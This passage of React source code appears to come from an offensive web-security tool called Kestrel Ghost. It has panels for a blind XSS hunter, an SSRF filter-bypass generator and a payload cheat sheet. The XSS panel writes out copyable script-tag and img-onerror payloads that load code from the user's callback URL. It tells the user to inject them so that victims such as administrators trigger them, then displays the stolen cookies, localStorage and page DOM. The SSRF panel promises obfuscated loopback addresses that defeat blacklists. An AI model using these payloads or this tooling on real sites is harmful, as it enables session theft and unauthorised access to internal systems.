                      <div 
                        className="animate-fade-in"
                        style={{ 
                          marginTop: '20px', 
                          padding: '16px', 
                          borderRadius: 'var(--radius-md)', 
                          border: '1px solid var(--border-light)',
                          background: 'rgba(0,0,0,0.2)' 
                        }}
                      >
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
                          <span style={{ fontSize: '0.8rem', fontWeight: '750', color: 'var(--text-main)' }}>
                            TRANSMISSION RESULT
                          </span>
                          <span className={`badge ${forwardState === 'success' ? 'badge-success' : 'badge-error'}`}>
                            {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Transmission Failed'}
                          </span>
                        </div>

                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '12px' }}>
                          <div>Transmission Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
                        </div>

                        {forwardResult.body && (
                          <div style={{ marginTop: '10px' }}>
                            <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)' }}>TARGET RESPONSE BODY:</span>
                            <pre 
                              style={{ 
                                marginTop: '4px',
                                padding: '10px', 
                                borderRadius: '6px', 
                                background: '#04060a', 
                                fontSize: '0.75rem', 
                                fontFamily: 'monospace', 
                                color: '#00e676',
                                maxHeight: '150px',
                                overflowY: 'auto',
                                whiteSpace: 'pre-wrap',
                                wordBreak: 'break-all'
                              }}
                            >
                              {forwardResult.body}
                            </pre>
                          </div>
                        )}
                      </div>
                    )}
                  </section>
                </div>
              </div>
            ) : null}
          </>
        )}

        {/* --- MODULE 2: BLIND XSS HUNTER PANEL --- */}
        {activeTab === 'XSS' && (
          <>
            <header className={styles.panelHeader}>
              <div className={styles.urlContainer}>
                <div className={styles.urlWrapper}>
                  <span className={styles.urlLabel} style={{ color: '#7c4dff' }}>☣️ ... BLIND XSS PAYLOAD TAG</span>
                  <input 
                    type="text" 
                    readOnly 
                    value={`<script src="${xssPayloadUrl}"></script>`}
                    onClick={(e) => e.target.select()}
                    className={styles.urlInput}
                    style={{ color: '#7c4dff' }}
                  />
                  <button 
                    onClick={() => handleCopy(`<script src="${xssPayloadUrl}"></script>`, 'xsstag')}
                    className={styles.copyBtn}
                    title="Copy XSS script tag"
                  >
                    {copiedText === 'xsstag' ? <Check size={16} style={{ color: 'var(--color-success)' }} /> : <Copy size={16} />}
                  </button>
                </div>

                <div className={styles.headerActions}>
                  <button 
                    onClick={() => setIsPollingActive(!isPollingActive)} 
                    className="btn-secondary"
                    style={{ 
                      padding: '8px 12px', 
                      fontSize: '0.8rem',
                      borderColor: isPollingActive ? 'rgba(124, 77, 255, 0.4)' : 'var(--text-dark)',
                      color: isPollingActive ? '#7c4dff' : 'var(--text-muted)'
                    }}
                  >
                    <Radio size={14} className={isPollingActive ? 'animate-pulse-glow' : ''} />
                    {isPollingActive ? 'XSS Polling: ACTIVE' : 'Polling Paused'}
                  </button>

                  <button 
                    onClick={handleClearXssLogs}
                    disabled={xssTriggers.length === 0}
                    className="btn-secondary"
                    style={{ padding: '8px 12px', fontSize: '0.8rem', color: 'var(--color-error)' }}
                  >
                    <Trash2 size={14} />
                    Clear XSS Hits
                  </button>
                </div>
              </div>
            </header>

            {xssTriggers.length === 0 ? (
              <div className={`${styles.emptyState} animate-fade-in`}>
                <div className={styles.emptyStateContent}>
                  <div className={styles.waitingIllustration} style={{ borderColor: 'rgba(124, 77, 255, 0.3)' }}>
                    <div className={styles.radarRing1} style={{ border: '2px solid rgba(124, 77, 255, 0.15)' }}></div>
                    <div className={styles.radarRing2} style={{ border: '2px solid rgba(124, 77, 255, 0.08)' }}></div>
                    <div className={styles.radarCenter} style={{ background: '#7c4dff' }}></div>
                  </div>
                  <h2 className={styles.emptyStateTitle} style={{ color: 'var(--text-main)' }}>Awaiting Blind XSS Trigger</h2>
                  <p className={styles.emptyStateSubtitle} style={{ maxWidth: '520px' }}>
                    Inject your custom Kestrel Ghost XSS Script Tag into any target inputs, search fields, comments, or headers. When a victim (like an administrator) triggers the script, their parsed session details will pop up here instantly!
                  </p>
                </div>

                <div className={styles.demoBox} style={{ borderColor: 'rgba(124, 77, 255, 0.2)' }}>
                  <span className={styles.demoTitle} style={{ color: '#7c4dff' }}>
                    <ShieldCheck size={15} />
                    XSS Payload Example 1: Classic HTML Injection Script tag
                  </span>
                  <div className={styles.codeBlock} style={{ color: 'var(--text-main)' }}>
                    {`"><script src="${xssPayloadUrl}"></script>`}
                    <button 
                      onClick={() => handleCopy(`"><script src="${xssPayloadUrl}"></script>`, 'demo1')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'demo1' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>

                <div className={styles.demoBox} style={{ borderColor: 'rgba(124, 77, 255, 0.2)' }}>
                  <span className={styles.demoTitle} style={{ color: '#7c4dff' }}>
                    <ShieldCheck size={15} />
                    XSS Payload Example 2: Markdown / Image onerror payload
                  </span>
                  <div className={styles.codeBlock} style={{ color: 'var(--text-main)' }}>
                    {`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`}
                    <button 
                      onClick={() => handleCopy(`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 'demo2')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'demo2' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>
              </div>
            ) : selectedXss ? (
              <div className={`${styles.detailContent} animate-fade-in`}>
                
                {/* TRIGGERED INFO PANEL */}
                <section className={styles.summaryGrid}>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Payload Origin</span>
                    <span className={`${styles.methodPill}`} style={{ fontSize: '0.8rem', padding: '6px 12px', background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
                      BLIND XSS
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Handshake Timestamp</span>
                    <span className={styles.summaryValue}>
                      {new Date(selectedXss.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Victim IP Address</span>
                    <span className={styles.summaryValue} style={{ color: '#7c4dff', fontFamily: 'monospace' }}>
                      {selectedXss.ip}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Source Domain / Location</span>
                    <span className={styles.summaryValue} title={selectedXss.uri} style={{ textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                      {selectedXss.uri}
                    </span>
                  </div>
                </section>

                {/* DETAILED EXFILTRATION RECORDS */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
                  
                  {/* METADATA IDENTIFICATION */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <User size={16} style={{ color: '#7c4dff' }} />
                      <h3 className={styles.sectionTitle}>Client Environment Meta</h3>
                    </div>
                    <table className={styles.headersTable}>
                      <tbody>
                        <tr>
                          <td className={styles.headerKey}>Injected Page URL</td>
                          <td className={styles.headerVal} style={{ color: '#7c4dff', wordBreak: 'break-all' }}>{selectedXss.uri}</td>
                        </tr>
                        <tr>
                          <td className={styles.headerKey}>HTTP Referrer</td>
                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.referrer}</td>
                        </tr>
                        <tr>
                          <td className={styles.headerKey}>Browser User-Agent</td>
                          <td className={styles.headerVal}>{selectedXss.userAgent}</td>
                        </tr>
                      </tbody>
                    </table>
                  </section>

                  {/* COOKIES (SENSITIVE) */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Cpu size={16} style={{ color: 'var(--color-error)' }} />
                      <h3 className={styles.sectionTitle} style={{ color: 'var(--text-main)' }}>Captured Browser Cookies</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.cookies, 'xsscookies')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xsscookies' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre className={styles.bodyPre} style={{ borderLeft: '3px solid var(--color-error)', background: '#0a050d', color: '#ff5252' }}>
                      <code>{selectedXss.cookies || 'None (No active cookies found or cookies are secured via HTTP-Only)'}</code>
                    </pre>
                  </section>

                  {/* LOCAL STORAGE */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Database size={16} style={{ color: '#7c4dff' }} />
                      <h3 className={styles.sectionTitle}>Victim LocalStorage Data</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.localStorage, 'xsslocal')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xsslocal' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre className={styles.bodyPre}>
                      <code dangerouslySetInnerHTML={getHighlightedJson(selectedXss.localStorage)} />
                    </pre>
                  </section>

                  {/* DOM HTML CODE VIEW */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <FileCode size={16} style={{ color: '#00e676' }} />
                      <h3 className={styles.sectionTitle}>Victim Page DOM Structure (HTML)</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.dom, 'xssdom')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xssdom' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre 
                      className={styles.bodyPre} 
                      style={{ 
                        maxHeight: '400px', 
                        overflowY: 'auto', 
                        fontFamily: 'monospace', 
                        fontSize: '0.75rem', 
                        background: '#040608', 
                        color: 'rgba(255, 255, 255, 0.8)' 
                      }}
                    >
                      <code>{selectedXss.dom}</code>
                    </pre>
                  </section>

                </div>
              </div>
            ) : null}
          </>
        )}

        {/* --- MODULE 3: STEALTH SSRF BYPASS GENERATOR --- */}
        {activeTab === 'SSRF' && (
          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
            
            {/* Input target control */}
            <div 
              style={{ 
                padding: '24px', 
                background: 'rgba(255, 255, 255, 0.02)', 
                borderRadius: 'var(--radius-xl)', 
                border: '1px solid var(--border-light)', 
                marginBottom: '30px',
                boxShadow: '0 8px 32px rgba(0,0,0,0.2)'
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                <Zap size={18} style={{ color: 'var(--color-secondary)' }} />
                <h2 style={{ fontSize: '1.2rem', fontWeight: '850', color: 'var(--text-main)' }}>STEALTH SSRF BYPASS ENGINES</h2>
              </div>
              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '18px', maxWidth: '620px' }}>
                Type an IP address or localhost domain block. Our generator converts them instantly into obfuscated variations that trick strict regex parsers and blacklists.
              </p>
              
              <div style={{ display: 'flex', gap: '12px' }}>
                <input 
                  type="text" 
                  value={ssrfTarget}
                  onChange={(e) => setSsrfTarget(e.target.value)}
                  placeholder="e.g., 127.0.0.1 or localhost"
                  className="input-field"
                  style={{ flex: 1, padding: '14px', fontSize: '0.9rem', fontFamily: 'monospace' }}
                />
                <button 
                  onClick={() => setSsrfTarget('127.0.0.1')}
                  className="btn-secondary"
                  style={{ padding: '0 16px', fontSize: '0.85rem' }}
                >
                  Reset Loopback
                </button>
              </div>
            </div>

            {/* Generated results cards */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <span style={{ fontSize: '0.85rem', fontWeight: '800', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '1px' }}>
                SSRF ENCODED PAYLOADS GENERATED ({ssrfBypasses.length})
              </span>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '16px' }}>
                {ssrfBypasses.map((bypass, idx) => (
                  <div 
                    key={idx} 
                    style={{ 
                      padding: '20px', 
                      background: 'rgba(8,11,18,0.7)', 
                      borderRadius: 'var(--radius-lg)', 
                      border: '1px solid var(--border-light)', 
                      display: 'flex', 
                      flexDirection: 'column', 
                      gap: '12px',
                      transition: 'all 0.2s ease'
                    }}
                    onMouseEnter={(e) => e.currentTarget.style.borderColor = 'rgba(0, 242, 254, 0.2)'}
                    onMouseLeave={(e) => e.currentTarget.style.borderColor = 'var(--border-light)'}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--color-primary)', textTransform: 'uppercase' }}>
                        {bypass.category}
                      </span>
                      <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                        ID: SSRF-00{idx + 1}
                      </span>
                    </div>

                    <div 
                      style={{ 
                        display: 'flex', 
                        alignItems: 'center', 
                        background: '#040608', 
                        border: '1px solid var(--border-medium)', 
                        borderRadius: 'var(--radius-md)', 
                        padding: '12px 16px',
                        gap: '12px' 
                      }}
                    >
                      <span 
                        style={{ 
                          color: '#00e676', 
                          fontFamily: 'monospace', 
                          fontSize: '0.9rem', 
                          fontWeight: '600', 
                          flex: 1, 
                          whiteSpace: 'nowrap', 
                          overflowX: 'auto',
                          paddingBottom: '2px'
                        }}
                      >
                        {bypass.payload}
                      </span>
                      <button 
                        onClick={() => handleCopy(bypass.payload, `ssrf-${idx}`)}
                        className={styles.copyBtn}
                        style={{ flexShrink: '0' }}
                      >
                        {copiedText === `ssrf-${idx}` ? <Check size={15} style={{ color: 'var(--color-success)' }} /> : <Copy size={15} />}
                      </button>
                    </div>

                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
                      {bypass.desc}
                    </p>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}

        {/* --- MODULE 4: TACTICAL PAYLOADS CHEAT SHEET --- */}
        {activeTab === 'PAYLOADS' && (
          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
            
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
              <BookOpen size={18} style={{ color: 'var(--color-primary)' }} />
              <h2 style={{ fontSize: '1.2rem', fontWeight: '850', color: 'var(--text-main)' }}>TACTICAL PAYLOAD LIBRARY</h2>
            </div>
            <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '30px', maxWidth: '640px' }}>
              A highly curated, searchable cheat sheet of vulnerability testing payloads. These payloads are **dynamically pre-compiled and configured** with your personal active webhook listener and XSS callback routing URLs! No manual editing needed.
            </p>

            {/* List categories dynamically */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
              {filteredPayloads.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>
                  <HelpCircle size={32} style={{ margin: '0 auto 12px', color: 'var(--text-dark)' }} />
                  <p>No payloads match your current search and tier filter criteria.</p>
                </div>
              ) : (
                filteredPayloads.map(cat => (
                  <section key={cat.category} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                      <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--color-primary)' }}></span>
                      <h3 style={{ fontSize: '0.95rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                        {cat.title}
                      </h3>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                      {cat.items.map((item, idx) => (
                        <div 
                          key={idx}
                          style={{
                            padding: '18px',
                            background: 'rgba(255,255,255,0.01)',
                            border: '1px solid var(--border-light)',
                            borderRadius: 'var(--radius-lg)',
                            display: 'flex',
                            flexDirection: 'column',
                            gap: '10px'
                          }}
                        >
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                              <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
                                {item.title}
                              </h4>
                              
                              {/* Tech Stack Badge */}
                              {item.tech && (
                                <span 
                                  style={{
                                    fontSize: '0.58rem',
                                    fontWeight: '800',
                                    background: 'rgba(0, 230, 118, 0.08)',
                                    color: '#00e676',
                                    border: '1px solid rgba(0, 230, 118, 0.2)',
                                    padding: '1px 6px',
                                    borderRadius: '3px',
                                    textTransform: 'uppercase',
                                    fontFamily: 'monospace'
                                  }}
                                >
                                  💻 {item.tech}
                                </span>
                              )}

                              {/* Dynamically Color-Coded Badges based on Era/Priority */}
                              {item.priority === 'HIGH' ? (
                                <span 
                                  style={{ 
                                    fontSize: '0.62rem', 
                                    fontWeight: '750', 
                                    background: 'rgba(255, 23, 68, 0.12)', 
                                    color: '#ff1744', 
                                    border: '1px solid rgba(255, 23, 68, 0.25)',
                                    padding: '2px 8px',
                                    borderRadius: '4px',
                                    letterSpacing: '0.5px'
                                  }}
                                  className="animate-pulse-glow"
                                >
                                  🔥 HIGH TIER ({item.era})
                                </span>
                              ) : item.priority === 'MEDIUM' ? (
                                <span 
                                  style={{ 
                                    fontSize: '0.62rem', 
                                    fontWeight: '750', 
                                    background: 'rgba(255, 145, 0, 0.12)', 
                                    color: '#ff9100', 
                                    border: '1px solid rgba(255, 145, 0, 0.25)',
                                    padding: '2px 8px',
                                    borderRadius: '4px'
                                  }}
                                >
                                  ⚡ MID TIER ({item.era})
                                </span>
                              ) : (
                                <span 
                                  style={{ 
                                    fontSize: '0.62rem', 
                                    fontWeight: '700', 
                                    background: 'rgba(150, 150, 150, 0.08)', 
                                    color: '#a0a0a0', 
                                    border: '1px solid rgba(150, 150, 150, 0.2)',
                                    padding: '2px 8px',
                                    borderRadius: '4px'
                                  }}
                                >
                                  🪨 LOW TIER ({item.era})
                                </span>
                              )}
                            </div>
                            
                            <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                              {cat.category}-00{idx + 1}
                            </span>
                          </div>

                          <div 
                            style={{ 
                              display: 'flex', 
                              alignItems: 'center', 
                              background: '#040608', 
                              border: '1px solid var(--border-medium)', 
                              borderRadius: 'var(--radius-md)', 
                              padding: '12px 14px',
                              gap: '12px' 
                            }}
                          >
                            <span 
                              style={{ 
                                color: '#00e676', 
                                fontFamily: 'monospace', 
                                fontSize: '0.85rem', 
                                flex: 1, 
                                whiteSpace: 'nowrap', 
                                overflowX: 'auto',
                                paddingBottom: '2px'
                              }}
                            >
                              {item.code}
                            </span>
                            <button 
                              onClick={() => handleCopy(item.code, `${cat.category}-${idx}`)}
                              className={styles.copyBtn}
                              style={{ flexShrink: '0' }}
                            >
                              {copiedText === `${cat.category}-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                            </button>
                          </div>

                          <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
                            {item.desc}
                          </p>
                        </div>
                      ))}
                    </div>
                  </section>
                ))
              )}
            </div>

          </div>
        )}

      </main>

      {/* MODAL CONFIG CUSTOM RESPONSE */}
      {isConfigOpen && (
        <div className={styles.configModal}>
          <form onSubmit={handleSaveConfig} className={`${styles.configCard} glass-panel animate-fade-in`}>
            <div className={styles.configHeader}>
              <h3 className={styles.configTitle}>
                <Settings size={18} className={styles.logoIcon} />
                Customize Ingestor Response
              </h3>
              <button 
                type="button" 
                onClick={() => setIsConfigOpen(false)}
                className={styles.copyBtn}
                style={{ fontSize: '1.2rem', padding: '4px 8px' }}
              >
                ✕
              </button>
            </div>

            <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '-8px' }}>
              Configure the HTTP status, Content-Type, and response body payload returned by the ingestor when your OOB Callback URL is hit.
            </p>

            <div className={styles.configGrid}>
              <div className={styles.configField}>
                <label className={styles.fieldLabel}>HTTP Status Code</label>
                <select 
                  value={configStatus} 
                  onChange={(e) => setConfigStatus(e.target.value)}
                  className={styles.selectField}
                >
                  <option value="200">200 OK</option>
                  <option value="201">201 Created</option>
                  <option value="202">202 Accepted</option>
                  <option value="204">204 No Content</option>
                  <option value="301">301 Moved Permanently</option>
                  <option value="302">302 Found</option>
                  <option value="400">400 Bad Request</option>
                  <option value="401">401 Unauthorized</option>
                  <option value="403">403 Forbidden</option>
                  <option value="404">404 Not Found</option>
                  <option value="500">500 Internal Server Error</option>
                  <option value="503">503 Service Unavailable</option>
                </select>
              </div>

              <div className={styles.configField}>
                <label className={styles.fieldLabel}>Content-Type Header</label>
                <select 
                  value={configContentType} 
                  onChange={(e) => setConfigContentType(e.target.value)}
                  className={styles.selectField}
                >
                  <option value="application/json">application/json (JSON)</option>
                  <option value="text/plain">text/plain (Plain Text)</option>
                  <option value="text/html">text/html (HTML Content)</option>
                  <option value="application/xml">application/xml (XML Document)</option>
                </select>
              </div>

              <div className={styles.configFieldFull}>
                <label className={styles.fieldLabel}>HTTP Response Body</label>
                <textarea 
                  placeholder={configContentType === 'application/json' ? '{"success": true, "data": {}}' : 'Response payload...'}
                  value={configBody}
                  onChange={(e) => setConfigBody(e.target.value)}
                  className={styles.textareaField}
                />
              </div>
            </div>

            <div className={styles.configActions}>
              <button 
                type="button" 
                onClick={() => setIsConfigOpen(false)}
                className="btn-secondary"
                style={{ padding: '10px 16px' }}
              >
                Cancel
              </button>
              <button 
                type="submit" 
                className="btn-primary"
                style={{ padding: '10px 20px' }}
              >
                Apply Configuration
              </button>
            </div>
          </form>
        </div>
      )}

    </div>
  );
}
